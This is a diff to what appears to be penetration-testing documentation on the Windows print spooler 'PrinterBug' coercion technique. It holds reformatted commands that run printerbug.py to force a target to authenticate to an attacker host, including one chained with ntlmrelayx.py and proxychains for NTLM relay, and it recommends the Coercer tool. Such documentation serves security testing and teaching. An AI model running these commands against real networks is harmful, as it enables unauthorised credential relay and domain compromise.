@@ -18,7 +18,7 @@ The "specific call" mentioned above is the `RpcRemoteFindFirstPrinterChangeNotif
 
 ## Practice
 
-[Coercer](https://github.com/p0dalirius/Coercer) (Python) can also be used to trigger all available MS-RPC coercions (including this one) in a single tool, with or without target filtering.
+The recommended way to audit and exploit this technique is [Coercer](https://github.com/p0dalirius/Coercer) (Python), which supports all available MS-RPC coercion methods in a single tool.
 
 ```bash
 # Scan for available coercion methods
@@ -39,7 +39,7 @@ The spooler service can be triggered with [printerbug](https://github.com/dirkja
 Trigger the spooler service
 
 ```bash
-printerbug.py 'DOMAIN'/'USER':'PASSWORD'@'TARGET' 'ATTACKER HOST'
+printerbug.py "$DOMAIN/$USER:$PASSWORD@$TARGET" "$ATTACKER_HOST"
 ```
 
 
@@ -68,7 +68,7 @@ In the situation where the tester doesn't have any credentials, it is still poss
 
 ```bash
 ntlmrelayx.py -t smb://$TARGET -socks
-proxychains printerbug.py -no-pass 'DOMAIN'/'USER'@'TARGET' 'ATTACKER HOST'
+proxychains printerbug.py -no-pass "$DOMAIN/$USER@$TARGET" "$ATTACKER_HOST"
 ```
 
 :::
